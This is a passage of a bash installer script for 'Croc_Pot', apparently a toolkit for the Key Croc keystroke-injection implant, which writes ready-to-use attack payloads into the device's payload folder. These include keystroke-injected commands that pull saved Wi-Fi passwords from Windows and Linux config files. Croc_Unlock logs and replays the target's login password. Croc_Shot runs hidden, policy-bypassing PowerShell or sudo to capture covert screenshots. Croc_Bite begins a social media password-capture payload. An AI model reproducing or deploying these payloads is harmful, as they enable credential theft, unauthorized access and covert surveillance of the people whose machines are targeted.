		Q ENTER\n		Q DELAY 2000\n		Q STRING \"\\\"\\\$(\\\$lastObject.PROFILE_NAME) \\\$(\\\$lastObject.PASSWORD)\\\" | Out-File -Encoding UTF8 \\\"\\\$MOUNT_POINT\\\tools\Croc_Pot\wifipass.txt\\\"\"\n		Q ENTER\n		Q DELAY 5000\n		Q STRING \"Dismount-WindowsImage -Path \\\$MOUNT_POINT ; exit\"\n		Q ENTER\n;;\n	getonline_R)
		Q CONTROL-ALT-d\n		Q CONTROL-ALT-t\n		Q DELAY 2000\n		Q STRING \"MOUNT_POINT=/media/\\\$(whoami)/KeyCroc\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"currentSSID=\\\$(iw dev wlan0 info | grep ssid | awk '{print \\\$2}')\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"SSID_pw=\\\$(sudo sed -e '/ssid\ psk/,+1p' -ne \\\":a;/\\\$currentSSID/{n;h;p;x;ba}\\\" /etc/wpa_supplicant/wpa_supplicant.conf | sed 's/[[:space:]]//g' | sed 's/psk=\\\"\(.*\)\\\"/\1/')\"
		Q ENTER\n		Q DELAY 2000\n		Q STRING \"echo \\\"\\\$currentSSID \\\$SSID_pw\\\" | tee \\\$MOUNT_POINT/tools/Croc_Pot/wifipass.txt\"\n		Q ENTER\n		Q DELAY 3000\n		Q STRING \"umount \\\$MOUNT_POINT ; exit\"\n		Q ENTER\n;;\n	getonline_L)\n		if [ -f /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered ]; then
			PC_PW=\$(sed '\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\n		else\n			PC_PW=LINUX\n		fi\n		Q CONTROL-ALT-d\n		Q ALT-t\n		Q DELAY 2000\n		Q STRING \"MOUNT_POINT=\\\"/mnt/usb\\\" ; sudo mkdir -p \\\$MOUNT_POINT ; sudo mount -L \\\"KeyCroc\\\" \\\$MOUNT_POINT\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"\$PC_PW\"
		Q ENTER\n		Q DELAY 2000\n		Q STRING \"currentSSID=\\\$(iw dev wlan0 info | grep ssid | awk '{print \\\$2}')\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"SSID_pw=\\\$(sudo grep -r '^psk=' /etc/NetworkManager/system-connections/\\\$currentSSID* | sed -e 's/psk=//g')\"\n		Q ENTER\n		Q DELAY 2000\n		Q STRING \"echo \\\"\\\$currentSSID \\\$SSID_pw\\\" | sudo tee \\\$MOUNT_POINT/tools/Croc_Pot/wifipass.txt\"
		Q ENTER\n		Q DELAY 3000\n		Q STRING \"sudo umount \\\$MOUNT_POINT ; exit\"\n		Q ENTER\n;;\nesac\n\nATTACKMODE HID\nsleep 3\n\nLED SETUP\nkill -9 \$(pidof wpa_supplicant) && kill -9 \$(pidof dhclient)\nifconfig wlan0 down\n\nif [ \"\$LOOT\" = \"getonline_W\" ]; then\n	sed -i -e '1s/^[^[:print:]]*//' \$wifi_pass\n	sed -i 's/\\\r//g' \$wifi_pass\nfi\n
sed -i 's/\( \)*/\1/g' \$wifi_pass\nsed -i -E -e '/^[WS]/d' -e '14 a WIFI_SSID\\\nWIFI_PASS\\\nSSH ENABLE' root/udisk/config.txt\nsed -i -E -e '1{x;s#^#sed -n 1p '\$wifi_pass'#e;x};10{G;s/\\\n(\S+).*/ \1/};11{G;s/\\\n\S+//}' root/udisk/config.txt\nwpa_passphrase \$(sed 's/ .*//' \$wifi_pass) \$(sed 's/.* //' \$wifi_pass) > /etc/wpa_supplicant.conf\nifconfig wlan0 up
wpa_supplicant -B -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf && dhclient wlan0\nsleep 3\nsystemctl restart ssh.service\n\n[ : >/dev/tcp/8.8.8.8/53 ] && LED FINISH || LED R\nsleep 3\nLED OFF\n" > "$CROC_GETONLINE"
			cat "$CROC_GETONLINE" ; echo -ne "\n$LINE\n"
			ColorGreen "CROC_GETONLINE PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER$clear\n" ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
fi
}
##
#----Croc_Unlock Payload Function
##
croc_unlock_payload() {
	Info_Screen '-Payload Called Croc_Unlock
-Pressing GUI-l will open windows / linux parrot OS login screen and wait
for user to enter passwd with SAVEKEYS command

-Pressing CONTROL-ALT-F3 will open Raspberry pi 4 terminal login screen and wait
for user to enter passwd with SAVEKEYS command

-Type in crocunlock at the target login screen will delete crocunlock characters
and enter user passwd

-Payload will save passwd at /tools/Croc_Pot/Croc_unlock.txt.filtered
-Old passwd will be save at /loot/Croc_Pot/Croc_unlock.txt.filtered

-NOTE: This payload is relying on the ENTER key to be press after user has enter
passwd

-After install unplug and plug back in keycroc
-Tested on Windows,Raspberrypi,Linux'
if [ -f "/root/udisk/payloads/Croc_unlock.txt" ]; then
	cat /root/udisk/payloads/Croc_unlock.txt ; echo -ne "\n$LINE\n"
	ColorGreen "CROC_UNLOCK PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER$clear\n"
else
	read_all 'INSTALL CROC_UNLOCK PAYLOAD Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			echo -ne "# Title:           Croc_Unlock\n# Description:     Save target passwd with SAVEKEYS command by pressing GUI-l or CONTROL-ALT-F3\n#                  Log in with typing crocunlock, save at /loot/Croc_Pot/Croc_unlock.txt.filtered and /tools/Croc_Pot/Croc_unlock.txt.filtered
# Author:          Spywill\n# Version:         2.2\n# Category:        Key Croc\n# Props:           RootJunky\n\nMATCH (crocunlock|GUI-l|CONTROL-ALT-F3)\n\nUNLOCK_TMP=\"/tmp/unlock_Count.txt\"\n\nCROC_POT_DIR=(/root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot)
for dir in \"\${CROC_POT_DIR[@]}\"; do [[ ! -d \"\$dir\" ]] && mkdir \"\$dir\" || LED B; done\n\nUNLOCK_FILE() {\n	until [ -f /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered ]; do\n		:\n	done\n	sed -i '/\\\b'\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)'\\\b/!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered
	LED G\n	Q DELAY 1000\n	LED OFF\n}\n\nUNLOCK_COUNT() {\n	if [ -f \$UNLOCK_TMP ]; then\n		i=\$(sed -n 1p \$UNLOCK_TMP)\n		echo \"\$(( \$i + 1 ))\" > \$UNLOCK_TMP\n	else\n		echo \"\$(( i++ ))\" > \$UNLOCK_TMP\n		if [ -f /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered ]; then
			sed -i '/\\\b'\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)'\\\b/!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered\n			cat /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered >> /root/udisk/loot/Croc_Pot/Croc_unlock.txt.filtered\n			rm -f /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered /root/udisk/tools/Croc_Pot/Croc_unlock.txt
		fi\n	fi\n	Q DELAY 1000\n}\n\nRELOAD() {\n	killall -9 bash\n	killall -9 python\n	sleep 1\n	RELOAD_PAYLOADS\n}\n\ncase \$LOOT in\n	\"GUI-l\" | \"CONTROL-ALT-F3\")\n		UNLOCK_COUNT\n		if [ \"\$(sed -n 1p \$UNLOCK_TMP)\" -gt \"0\" ]; then\n			UNLOCK_FILE\n			RELOAD
		elif [ \"\$(sed -n 1p \$UNLOCK_TMP)\" -eq \"0\" ]; then\n			if [ \"\$LOOT\" = \"CONTROL-ALT-F3\" ]; then\n				if [ -f /root/udisk/tools/Croc_Pot/Croc_OS.txt ]; then\n					if [ \"\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\" = \"raspberrypi\" ]; then\n						Q STRING \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)\"
						Q ENTER\n						Q DELAY 1000\n					fi\n				fi\n			elif [ \"\$LOOT\" = \"GUI-l\" ]; then\n				Q BACKSPACE\n			fi\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_unlock.txt UNTIL ENTER\n			LED ATTACK\n			UNLOCK_FILE\n		fi\n;;\n	crocunlock)
		if [ -f /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered ]; then\n			UNLOCK_FILE\n			LED SETUP\n			Q BACKSPACE\n			Q BACKSPACE\n			Q BACKSPACE\n			Q BACKSPACE\n			Q BACKSPACE\n			Q BACKSPACE\n			Q BACKSPACE\n			Q BACKSPACE\n			Q BACKSPACE\n			Q BACKSPACE\n			Q DELAY 1000
			Q STRING \"\$(sed '\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\"\n			Q ENTER\n			LED OFF\n			RELOAD\n		else\n			LED R\n			RELOAD\n		fi\n;;\nesac\n" > /root/udisk/payloads/Croc_unlock.txt
			cat /root/udisk/payloads/Croc_unlock.txt ; echo -ne "\n$LINE\n"
			ColorGreen "CROC_UNLOCK PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER$clear\n" ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
fi
}
##
#----Wifi_setup Create Payload connect to wifi ap quickly, or Change by terminal
##
wifi_setup_payload() {
	Info_Screen 'Connect Keycroc to a wifi access point quickly
-Enter SSID and Passwd and connect to access point

[T] Connect to different access point from terminal
[I] Create payload with match word and connect to access point

-THE PURPOSE OF THIS PAYLOAD IS, IF YOU MOVE YOUR KEYCROC
AROUND TO DIFFERENT WIFI ACCESS POINTS CREATE A PAYLOAD WITH
MATCH WORD AND CONNECT TO WIFI ACCESS POINT QUICKLY

Thanks to dark_pyrro payload [ Key-Croc-AP_STA ]'
	SSID_CHECK
	read_all '[I]-INSTALL [T]-TERMINAL [N]-NONE AND PRESS [ENTER]'
	case "$r_a" in
		[Ii])
			ColorYellow 'CURRENTLY INSTALLED PAYLOADS\n'
			ColorCyan "$(ls /root/udisk/payloads | grep ".txt")\n"
			read_all 'ENTER A NAME FOR THIS PAYLOAD AND PRESS [ENTER]' ; local name_payload="$r_a"
			local PAYLOAD_FOLDER=/root/udisk/payloads/$name_payload.txt
			if [ -f "$PAYLOAD_FOLDER" ]; then
				cat "$PAYLOAD_FOLDER" ; echo -ne "\n$LINE\n"
				ColorRed 'THIS PAYLOAD ALREADY EXISTS PLEASE CHOOSE A DIFFERENT NAME'
			else
				read_all 'ENTER THE MATCH WORD TO TRIGGER PAYLOAD AND PRESS [ENTER]' ; local USER_MATCH="$r_a"
				read_all 'ENTER ACCESS POINTS NAME AND PRESS [ENTER]' ; local USER_SSID="$r_a"
				user_input_passwd /tmp/0 SSID ; local WIFI_PASS="$password"
				echo -ne "# Title:         WIFI-SETUP\n# Description:   Connect to access point quickly by match word add ssid and passwd\n# Author:        spywill\n# Version:       1.4\n# Category:      Key Croc\n# Props:         dark_pyrro\n
MATCH ${USER_MATCH}\n\nLED SETUP\nsed -i -E -e '/^[WS]/d' -e '14 a WIFI_SSID ${USER_SSID}\\\nWIFI_PASS ${WIFI_PASS}\\\nSSH ENABLE' /root/udisk/config.txt\nsleep 1\n\nPID_WPA=\$(pidof wpa_supplicant)\nPID_DHC=\$(pidof dhclient)
ifconfig wlan0 down\necho -ne \"network={\\\n\\\tssid=\\\"${USER_SSID}\\\"\\\n\\\tpsk=\\\"${WIFI_PASS}\\\"\\\n\\\tpriority=1\\\n}\" > /etc/wpa_supplicant.conf\nkill -9 \$PID_WPA && kill -9 \$PID_DHC\nsleep 2
ifconfig wlan0 up\nsleep 2\nwpa_supplicant -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf -B && dhclient wlan0\nsleep 5\nsystemctl restart ssh.service\nsleep 1\n\nif : >/dev/tcp/8.8.8.8/53; then\n	LED FINISH\nelse\n	LED R\nfi\nsleep 3\nLED OFF" > "$PAYLOAD_FOLDER"
				cat "$PAYLOAD_FOLDER" ; echo -ne "\n$LINE\n"
				ColorGreen 'WIFI_SETUP PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER\n'
				ColorYellow '-TYPE IN MATCH WORD LED WILL LIGHT UP GREEN\nTHEN KEYCROC SHOULD BE CONNECTED TO WIFI ACCESS POINT\n'
			fi ;;
		[Tt])
			ColorYellow ' Checking for wifi access points \n'
			iw dev wlan0 scan | grep -E "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort
			read_all 'ENTER ACCESS POINTS NAME AND PRESS [ENTER]' ; local USER_SSID="$r_a"
			user_input_passwd /tmp/0 SSID
			ACCESS_POINT() {
				LED SETUP
				kill -9 $(pidof wpa_supplicant) && kill -9 $(pidof dhclient)
				ifconfig wlan0 down
				sed -i -E -e '/^[WS]/d' -e '14 a WIFI_SSID $USER_SSID\nWIFI_PASS $password\nSSH ENABLE' /root/udisk/config.txt
				wpa_passphrase $USER_SSID $password > /etc/wpa_supplicant.conf
				ifconfig wlan0 up
				wpa_supplicant -B -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf && dhclient wlan0
				sleep 3
				systemctl restart ssh.service
				[ : >/dev/tcp/8.8.8.8/53 ] && LED FINISH || LED R
				sleep 3
				LED OFF
				exit
			}
			ColorRed 'Changing access point will terminate this ssh session\n'
			read_all 'CHANGE ACCESS POINT Y/N AND PRESS [ENTER]'
			case "$r_a" in
				[yY] | [yY][eE][sS])
					ACCESS_POINT ;;
				[nN] | [nN][oO])
					ColorYellow 'Maybe next time\n' ;;
				*)
					invalid_entry ;;
			esac ;;
		[nN])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Quick_Start_Croc_Pot (payload) start Croc_Pot without OS detection
##
quick_croc_pot() {
	Info_Screen '-Install payload called Quick_Start_Croc_Pot
-Quickly Start Croc_Pot without OS detection
-This is for when you Already ran OS detection on target by crocpot
-Match word is qspot'
	local qs_croc=/root/udisk/payloads/Quick_start_Croc_Pot.txt
	if [ -f "$qs_croc" ]; then
		cat "$qs_croc" ; echo -ne "\n$LINE\n"
		ColorGreen 'Quick_start_Croc_Pot PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER\n'
	else
		read_all 'INSTALL QUICK START CROC_POT PAYLOAD Y/N AND PRESS [ENTER]'
		case "$r_a" in
			[yY] | [yY][eE][sS])
				echo -ne "# Title:         Quick Start Croc_Pot\n# Description:   Quickly Start Croc_pot.sh bash script without OS detection\n#                Will need to run Croc_Pot_Payload.txt first before running this payload
#                This is for when you Already ran OS detection on target\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n#\nMATCH qspot\n#\nCROC_PW=$(sed -n 1p /tmp/CPW.txt)      #<-----Edit KEYCROC_PASSWD_HERE
echo \"\${CROC_PW}\" >> /tmp/CPW.txt\n#\nif [ \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\" = WINDOWS ]; then\n	Q GUI d\n	LED R\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell\"\n	Q ENTER\n	sleep 3\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk '{print \$2}' | cut -c 6-)\"
	Q ENTER\n	sleep 3\n	Q STRING \"\${CROC_PW}\"\n	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER\nelse\nif [ \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\" = LINUX ]; then\n    HOST_CHECK=\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n    case \$HOST_CHECK in\n    raspberrypi)
	LED B\n	Q CONTROL-ALT-d\n	Q CONTROL-ALT-t\n	sleep 2\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk '{print \$2}' | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"\n	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"
	Q ENTER ;;\n    $HOST_CHECK)\n	Q GUI d\n	LED B\n	Q ALT-t\n	sleep 1\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk '{print \$2}' | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"
	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER ;;\n    *)\n	Q GUI d\n	LED B\n	Q ALT F2\n	sleep 1\n	Q STRING \"xterm\"\n	Q ENTER\n	sleep 1\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk '{print \$2}' | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"
	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER ;;\n  esac\n fi\nfi\nLED FINISH" > "$qs_croc"
				cat "$qs_croc" ; echo -ne "\n$LINE\n"
				ColorGreen 'Quick_start_Croc_Pot PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER\n' ;;
			[nN] | [nN][oO])
				ColorYellow 'Maybe next time\n' ;;
			*)
				invalid_entry ;;
		esac
	fi
}
##
#----Croc_Shot take Screenshot of target and save to loot folder
##
screen_shot() {
	Info_Screen '-Option to install Croc_Shot.txt payload this will take screenshot of Target
-To start the Croc_Shot payload MATCH word crocshot
-This will save to loot/Croc_Pot/screenshot
-Option to take screenshot now
-For this to work properly run Croc_Pot_Payload.txt first to get OS detection'
if [ -d /root/udisk/loot/Croc_Pot/screenshot ]; then
	LED B
else
	mkdir /root/udisk/loot/Croc_Pot/screenshot
fi
##
#----Screen Croc_Shot Payload install
##
	local Croc_Shot=/root/udisk/payloads/Croc_Shot.txt
if [ -f "$Croc_Shot" ]; then
	cat "$Croc_Shot" ; echo -ne "\n$LINE\n"
	ColorGreen 'Croc_Shot.txt Payload is installed check payload folder\n'
else
	read_all 'INSTALL CROC_SHOT PAYLOAD Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			echo -ne "# Title:         CrocShot\n# Description:   Take screenshot of PC and save to loot/Croc_Pot/screenshot\n# Author:        spywill\n# Version:       1.1\n# Category:      Key Croc\n\nMATCH crocshot\n\n#---> Check for save passwd run CrocUnlock first if not edit below\nif [ -e \"/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered\" ]; then\n	PC_PW=\$(sed '\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)
else\n#---> Edit LINUX-PC_PASSWD_HERE\n	PC_PW=LINUX\nfi\n\nif [ -d /root/udisk/loot/Croc_Pot/screenshot ]; then\n	LED B\nelse\n	mkdir /root/udisk/loot/Croc_Pot/screenshot\nfi\n\nWINDS_SHOT=/root/udisk/tools/Croc_Pot/winds_shot.ps1\nOS_CHECK=\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\nHOST_CHECK=\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n\nif [ \"\${OS_CHECK}\" = WINDOWS ]; then\n	if [ -e \"\${WINDS_SHOT}\" ]; then
	ATTACKMODE HID STORAGE\n	LED ATTACK\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell -nop -ex Bypass -w Hidden\"\n	Q ENTER\n	sleep 1\n	Q STRING \"\\\$Croc = (gwmi win32_volume -f 'label=\\\"KeyCroc\\\"' | Select-Object -ExpandProperty DriveLetter)\"
	Q ENTER\n	sleep 1\n	Q STRING \".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')\"\n	Q ENTER\n	sleep 5\n	Q STRING \"exit\"\n	Q ENTER\n	ATTACKMODE HID\n	LED FINISH\nelse\n	LED ATTACK
echo -ne \"\\\$outputFile = \\\"\\\$Croc\loot\Croc_Pot\screenshot\\\\\\\\\\\$(get-date -format 'yyyy-mm-%d HH.mm.ss').png\\\"\\\n\nAdd-Type -AssemblyName System.Windows.Forms\\\nAdd-type -AssemblyName System.Drawing\\\n\n\\\$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\\\n\\\$Width = \\\$Screen.Width\\\n
\\\$Height = \\\$Screen.Height\\\n\\\$Left = \\\$Screen.Left\\\n\\\$Top = \\\$Screen.Top\\\n\\\$screenshotImage = New-Object System.Drawing.Bitmap \\\$Width, \\\$Height\\\n\n\\\$graphicObject = [System.Drawing.Graphics]::FromImage(\\\$screenshotImage)\\\n\\\$graphicObject.CopyFromScreen(\\\$Left, \\\$Top, 0, 0, \\\$screenshotImage.Size)\\\n
\\\$screenshotImage.Save(\\\$outputFile)\\\nWrite-Output \\\"Saved to:\\\"\\\nWrite-Output \\\$outputFile\\\nStart-Sleep -s 5\" >> \${WINDS_SHOT}\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell -nop -ex Bypass -w Hidden\"\n	Q ENTER\n	sleep 1\n	Q STRING \"\\\$Croc = (gwmi win32_volume -f 'label=\\\"KeyCroc\\\"' | Select-Object -ExpandProperty DriveLetter)\"
	Q ENTER\n	sleep 1\n	Q STRING \".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')\"\n	Q ENTER\n	sleep 5\n	Q STRING \"exit\"\n	Q ENTER\n	ATTACKMODE HID\n	LED FINISH\n	fi\nelse\ncase \$HOST_CHECK in\nraspberrypi)\n	ATTACKMODE HID STORAGE\n	LED ATTACK\n	sleep 1\n	Q ALT-F4\n	Q CONTROL-ALT-t
	sleep 1\n	Q STRING \"PC_PIC=/media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/%b-%d-%y-%H.%M.%S.png; nohup scrot -b -d 5 \\\${PC_PIC} &>/dev/null & exit\"\n	Q ENTER\n	sleep 2\n	ATTACKMODE HID\n	LED FINISH ;;\n\$HOST_CHECK)\n	ATTACKMODE HID STORAGE\n	LED ATTACK\n	Q ALT-t
	sleep 1\n	Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"
	Q ENTER\n	sleep 1\n	Q STRING \"\${PC_PW}\"\n	Q ENTER\n	sleep 1\n	Q STRING \"sleep 2; import -window root /media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/\$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\\\$(whoami)/KeyCroc/; sudo rmdir /media/\\\$(whoami)/KeyCroc/; exit\"\n	Q ENTER\n	Q ALT-TAB\n	sleep 10
	ATTACKMODE HID\n	LED FINISH ;;\n*)\n	LED ATTACK\n	Q ALT-t\n	sleep 1\n	Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"
	Q ENTER\n	sleep 1\n	Q STRING \"\${PC_PW}\"\n	Q ENTER\n	sleep 1\n	Q STRING \"sleep 2; import -window root /media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/\$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\\\$(whoami)/KeyCroc/; sudo rmdir /media/\\\$(whoami)/KeyCroc/; exit\"\n	Q ENTER\n	Q ALT-TAB\n	sleep 10\n	ATTACKMODE HID\n	LED FINISH ;;\n esac\nfi" > "$Croc_Shot"
			cat "$Croc_Shot" ; echo -ne "\n$LINE\n"
			ColorGreen 'Croc_Shot.txt payload is now install check payloads folder\n' ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
fi
##
#----Croc_Shot take pic run from terminal
##
read_all 'TAKE SCREENSHOT NOW OF TARGET Y/N AND PRESS [ENTER]'
case "$r_a" in
	[yY] | [yY][eE][sS])
		ATTACKMODE HID STORAGE
		local WINDS_SHOT=/root/udisk/tools/Croc_Pot/winds_shot.ps1
		if [ "$(OS_CHECK)" = WINDOWS ]; then
			if [ -e "$WINDS_SHOT" ]; then
				QUACK GUI r ; sleep 1 ; QUACK STRING "powershell -nop -ex Bypass -w Hidden" ; QUACK ENTER ; sleep 1
				QUACK STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
				QUACK ENTER ; sleep 1 ; QUACK STRING ".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')" ; QUACK ENTER ; sleep 5 ; QUACK STRING "exit" ; QUACK ENTER ; ATTACKMODE HID
			else
		echo -ne "\$outputFile = \"\$Croc\loot\Croc_Pot\screenshot\\\$(get-date -format 'yyyy-mm-%d HH.mm.ss').png\"\n
Add-Type -AssemblyName System.Windows.Forms\nAdd-type -AssemblyName System.Drawing\n
\$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\n\$Width = \$Screen.Width\n
\$Height = \$Screen.Height\n\$Left = \$Screen.Left\n\$Top = \$Screen.Top\n\$screenshotImage = New-Object System.Drawing.Bitmap \$Width, \$Height\n
\$graphicObject = [System.Drawing.Graphics]::FromImage(\$screenshotImage)\n\$graphicObject.CopyFromScreen(\$Left, \$Top, 0, 0, \$screenshotImage.Size)\n
\$screenshotImage.Save(\$outputFile)\nWrite-Output \"Saved to:\"\nWrite-Output \$outputFile\nStart-Sleep -s 5" > $WINDS_SHOT
		QUACK GUI r ; sleep 1 ; QUACK STRING "powershell -nop -ex Bypass -w Hidden" ; QUACK ENTER ; sleep 1
		QUACK STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)" ; QUACK ENTER ; sleep 1
		QUACK STRING ".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')" ; QUACK ENTER ; sleep 5 ; QUACK STRING "exit" ; QUACK ENTER ; ATTACKMODE HID
			fi
		else
			case "$HOST_CHECK" in
			raspberrypi)
				QUACK ALT-TAB ; QUACK CONTROL-ALT-t ; sleep 1
				QUACK STRING "PC_PIC=/media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/%b-%d-%y-%H.%M.%S.png; nohup scrot -b -d 2 \${PC_PIC} &>/dev/null & exit"
				QUACK ENTER ; QUACK ALT-TAB ; sleep 3 ; ATTACKMODE HID ;;
			"$HOST_CHECK")
				QUACK ALT-t ; QUACK ENTER ; sleep 1
				QUACK STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
				QUACK ENTER ; sleep 3 ; QUACK STRING "$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)" ; QUACK ENTER ; sleep 1
				QUACK STRING "sleep 2; import -window root /media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\$(whoami)/KeyCroc/; sudo rmdir /media/\$(whoami)/KeyCroc/; exit"
				QUACK ENTER ; QUACK ALT-TAB ; sleep 2 ; ATTACKMODE HID ;;
			*)
				QUACK ALT F2 ; sleep 1 ; QUACK STRING "xterm" ; QUACK ENTER ; sleep 1
				QUACK STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
				QUACK ENTER ; sleep 3 ; QUACK STRING "$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)" ; QUACK ENTER ; sleep 1
				QUACK STRING "sleep 2; import -window root /media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\$(whoami)/KeyCroc/; sudo rmdir /media/\$(whoami)/KeyCroc/; exit"
				QUACK ENTER ; QUACK ALT-TAB ; sleep 2 ; ATTACKMODE HID ;;
			esac
		fi ;;
	[nN] | [nN][oO])
		ColorYellow 'Maybe next time\n' ;;
	*)
		invalid_entry ;;
esac
}
##
#----Croc_Bite payload social media account passwd Attempt
##
croc_bite() {
	Info_Screen '-Attempt to retrieve target Social media account passwd
-Create a payload called Croc_Bite.txt MATCH word will be Social media name 
-This will open target web browser and open up Social media login page
-If successful passwd saved at /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered
-Ensure to run Croc_Pot_Payload.txt first'
	ColorRed '--THIS PAYLOAD IS RELYING ON THE ENTER KEY TO BE PRESSED\n
--AFTER THE USER HAS ENTER THE PASSWORD\n'
##
#----check for existing Croc_Bite payload
##
if [ -f "/root/udisk/payloads/Croc_Bite.txt" ]; then
	cat /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered ; echo -ne "\n$LINE\n"
	cat /root/udisk/payloads/Croc_Bite.txt ; echo -ne "\n$LINE\n"
	ColorYellow 'Existing Croc_Bite payload\n'
	read_all 'USE EXISTING CROC_BITE PAYLOAD Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			ColorYellow 'Keeping existing Croc_Bite payload\n' ;;
		[nN] | [nN][oO])
			ColorRed 'Removing existing Croc_Bite payload\n'
